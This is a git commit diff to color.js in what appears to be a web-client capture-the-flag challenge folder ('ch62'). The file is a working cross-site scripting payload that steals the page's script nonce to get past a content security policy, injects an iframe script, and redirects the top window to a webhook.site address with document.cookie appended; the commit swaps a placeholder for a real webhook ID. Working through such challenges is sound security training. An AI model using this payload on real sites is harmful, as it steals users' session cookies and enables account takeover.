96e4b73e87c7ac683f298c09d3c788592e2ee3e3
Nowaaayyy <105567753+Nowaaayyy@users.noreply.github.com>
2026-04-22 14:00:14 +0200

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,4 +1,4 @@
 var nonce = parent.document.querySelector('script').nonce;
 var iframe = parent.document.createElement('iframe');
-iframe.srcdoc = '<script nonce="' + nonce + '">parent.parent.location="https://webhook.site/ton-id?c="+parent.parent.document.cookie</script>';
+iframe.srcdoc = '<script nonce="' + nonce + '">parent.parent.location="https://webhook.site/c35e20ef-075e-4cc2-917b-22eda8f964a3?c="+parent.parent.document.cookie</script>';
 parent.document.body.appendChild(iframe);
